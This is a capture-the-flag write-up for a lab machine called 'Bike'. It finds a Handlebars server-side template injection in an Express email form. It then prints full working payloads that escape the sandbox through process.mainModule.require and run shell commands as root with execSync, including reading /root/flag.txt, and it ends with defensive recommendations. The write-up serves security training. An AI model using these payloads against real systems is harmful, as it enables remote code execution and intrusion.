# BIKE - Very Easy

**Date Started:** February 3, 2026  
**Difficulty:** Very Easy  
**Status:** ✅ COMPLETE

---

## Phase 1: Initial Reconnaissance

### Step 1: Initial Service Enumeration Scan

**Command:**
```bash
nmap -sC -sV -v TARGET_IP
```

**Explanation:**
- `-sC`: Run default NSE scripts
- `-sV`: Service version enumeration
- `-v`: Verbose output

**Scan Results:**

| Port | Service | Version | Status |
|------|---------|---------|--------|
| 80 | HTTP | Express.js | Open |

**Key Findings:**
- Web server running on port 80
- Express.js framework detected

---

## Phase 2: Web Footprinting & Technology Discovery

### Step 1: Initial Web Access

**Action:** Visited `http://TARGET_IP` in browser

**Finding:** Website displays a prompt asking for an email to receive updates

### Step 2: Technology Detection with Wappalyzer

**Tool:** Wappalyzer browser extension

**Result:** Identified Express.js as the web framework handling email submissions

### Step 3: Template Injection Testing

**Action:** Entered `{{7 * 7}}` in the email submission field

**Result:** Error page response revealed:
- Directory structure exposure: `/root/backup`
- **Handlebars template engine** is being used for processing the submission

**Vulnerability Identified:** Handlebars Server-Side Template Injection (SSTI)

---

## Phase 3: Exploitation - Handlebars SSTI

### Understanding the Attack Vector

Handlebars templates are being processed server-side without proper sanitization. By injecting template syntax, we can:
1. Access JavaScript objects and functions
2. Break out of the sandbox using `process.mainModule`
3. Execute arbitrary commands via `child_process`

### Step 1: Capture POST Request in Burp Suite

**Action:** 
- Intercepted email submission POST request
- Moved request to Repeater tab for payload testing
- All payloads must be URL-encoded before sending

### Step 2: Test Basic Template Evaluation

**Payload (URL-encoded):**
```handlebars
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

**Result:** Error message - `require is not defined`

**Analysis:** The Handlebars sandbox does not expose `require()` in the global scope. We need to find another way to access it.

### Step 3: Enumerate Process Object

**Payload (URL-encoded):**
```handlebars
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process;"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

**Response:**
```
We will contact you at: e
2
[object Object]
function Function() { [native code] }
2
[object Object]
[object process]
```

**Analysis:** Successfully accessed the `process` object! Now we can access its properties.

### Step 4: Access process.mainModule

**Key Discovery:** Node.js `process.mainModule` property (deprecated since v14.0.0 but still accessible) contains a reference to the main module. Since the main module is not sandboxed, we can use it to access `require()`.

**Payload (URL-encoded):**
```handlebars
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule;"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

**Response:**
```
We will contact you at: e
2
[object Object]
function Function() { [native code] }
2
[object Object]
[object Object]
```

**Analysis:** Successfully accessed mainModule! No error means we can proceed to load require from it.

### Step 5: Load child_process Module

**Payload (URL-encoded):**
```handlebars
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule.require('child_process');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

**Response:**
```
We will contact you at: e
2
[object Object]
function Function() { [native code] }
2
[object Object]
[object Object]
```

**Analysis:** Successfully loaded the `child_process` module! Now we can execute system commands.

### Step 6: Execute whoami Command

**Payload (URL-encoded):**
```handlebars
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

**Response:**
```
We will contact you at: e
2
[object Object]
function Function() { [native code] }
2
[object Object]
root
```

**Success!** We are executing commands as **root**.

---

## Phase 4: Flag Capture

### Step 1: List Root Directory Contents

**Payload (URL-encoded):**
```handlebars
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

**Response:**
```
flag.txt
```

**Finding:** Flag is located at `/root/flag.txt`

### Step 2: Read Flag

**Payload (URL-encoded):**
```handlebars
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

**Response:** Flag captured successfully!

---

## Key Findings

| Item | Details |
|------|---------|
| **Vulnerability Type** | Server-Side Template Injection (SSTI) - Handlebars |
| **Attack Vector** | Email submission form |
| **Sandboxing Bypass** | Using `process.mainModule` to escape Handlebars sandbox |
| **Command Execution** | Via `child_process.execSync()` |
| **Privilege Level** | root (immediate RCE as root) |
| **Root Cause** | Unsanitized user input passed to Handlebars template engine |

### Exploitation Chain Summary

1. **Discover Handlebars** → Test with `{{7*7}}`
2. **Identify SSTI** → Error message reveals template engine
3. **Access process object** → `process` is accessible
4. **Bypass sandbox** → Use `process.mainModule.require()`
5. **Load child_process** → Enables command execution
6. **Execute commands** → Use `execSync()` to run arbitrary commands
7. **Read flag** → Retrieved as root user

### Defensive Recommendations

- **Input Validation:** Sanitize all user input before passing to template engines
- **Template Sandboxing:** Use proper template sandboxing mechanisms
- **Principle of Least Privilege:** Run Node.js process with minimal privileges, not as root
- **Disable dangerous APIs:** Restrict access to `process.mainModule` and `require()` in templates
- **Use Security Headers:** Implement Content Security Policy

---

**Status:** ✅ FLAG CAPTURED - ROOT ACCESS ACHIEVED

